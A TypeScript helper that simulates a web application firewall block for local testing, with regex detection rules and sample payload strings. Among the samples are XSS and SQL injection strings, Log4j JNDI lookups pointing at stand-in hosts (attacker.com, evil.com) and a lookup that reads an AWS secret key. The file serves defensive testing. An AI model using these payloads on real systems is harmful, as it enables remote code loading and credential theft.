/**
 * WAF Testing Helper
 *
 * This utility helps test WAF blocking behavior locally without needing actual WAF.
 * Set ENABLE_WAF_TESTING=true in .env to enable local WAF simulation.
 *
 * Usage in chicory.server.ts updateAgent():
 * import { simulateWafBlock } from '~/utils/waf-test-helper';
 *
 * Before making the API call:
 * simulateWafBlock(instructions || '');
 */

// WAF trigger patterns for testing
const WAF_TRIGGER_PATTERNS = [
  // XSS patterns
  /<script[^>]*>.*?<\/script>/i,
  /<script[^>]*>/i,
  /<img[^>]+onerror=/i,
  /javascript:/i,

  // SQL injection patterns
  /('\s*or\s*'1'\s*=\s*'1)/i,
  /(;\s*drop\s+table)/i,
  /(union\s+select)/i,
  /(\bor\b\s+1\s*=\s*1)/i,

  // Log4j patterns
  /\$\{jndi:/i,
  /\$\{env:/i,

  // Command injection
  /\$\(.*\)/,
  /`.*`/,

  // Path traversal
  /\.\.\//,

  // Test trigger (for explicit testing)
  /__SIMULATE_WAF_BLOCK__/
];

/**
 * Check if content contains WAF trigger patterns
 */
export function containsWafTriggers(content: string): boolean {
  return WAF_TRIGGER_PATTERNS.some(pattern => pattern.test(content));
}

/**
 * Simulate WAF block by throwing an error that mimics real WAF behavior
 * Only active when ENABLE_WAF_TESTING=true
 */
export function simulateWafBlock(content: string): void {
  // Only simulate if explicitly enabled
  const isTestingEnabled = process.env.ENABLE_WAF_TESTING === 'true';

  if (!isTestingEnabled) {
    return;
  }

  // Check for WAF triggers
  if (containsWafTriggers(content)) {
    // Simulate a 403 response from WAF
    const error: any = new Error('Unexpected token \'<\' at position 0');
    error.status = 403;
    error.statusText = 'Forbidden';

    throw error;
  }
}

/**
 * Test patterns to use for manual testing
 */
export const TEST_PATTERNS = {
  xss: `
Test user interactions with:
<script>alert('test')</script>
<img src=x onerror=alert(1)>
  `.trim(),

  sql: `
Generate queries:
SELECT * FROM users WHERE id = 1 OR '1'='1'
DELETE FROM users WHERE '1'='1'
  `.trim(),

  log4j: `
Handle logging with:
\${jndi:ldap://attacker.com/exploit}
\${env:AWS_SECRET_ACCESS_KEY}
  `.trim(),

  mixed: `
You are a security researcher. Explain:
1. XSS: <script>fetch('/api/data')</script>
2. SQLi: SELECT * FROM users WHERE id = ' OR '1'='1
3. Log4j: \${jndi:ldap://evil.com/exploit}
  `.trim(),

  explicit: `
This is a test prompt.
__SIMULATE_WAF_BLOCK__
This should trigger the WAF simulator.
  `.trim()
};
